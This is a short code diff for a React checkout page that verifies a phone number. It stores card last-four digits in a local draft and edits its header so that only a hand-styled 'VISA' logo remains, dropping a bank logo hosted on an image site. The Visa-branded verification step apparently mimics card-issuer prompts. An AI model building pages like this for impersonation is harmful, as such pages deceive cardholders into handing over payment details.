@@ -8,7 +8,7 @@ const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';
 
 type CheckoutDraft = {
   phone?: unknown;
-  cardLast4?: string; // في حال تخزين آخر 4 أرقام من البطاقة
+  cardLast4?: string;
   stage?: unknown;
   orderId?: unknown;
   orderNumber?: unknown;
@@ -67,7 +67,6 @@ export default function VerifyPhonePage() {
         setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
         setDraftReady(true);
       } else {
-        // لتسهيل المعاينة والاختبار إذا لم تكن البيانات موجودة في المسودة
         setDraftReady(true);
       }
     } catch {
@@ -162,13 +161,10 @@ export default function VerifyPhonePage() {
   return (
     <div style={{ backgroundColor: '#ffffff', color: '#000000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: 'Arial, sans-serif' }}>
       
-      {/* Header */}
-      <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
+      {/* Header - تم إزالة لوجو البنك نهائياً وإبقاء لوجو فيزا فقط */}
+      <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
         <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
           VISA
-        </div>
-        <div>
-          <img src="https://i.ibb.co/6yq3m8P/bank-logo.png" alt="" style={{ height: '35px', display: 'block' }} onError={(e) => (e.currentTarget.style.display = 'none')} />
         </div>
       </header>
 
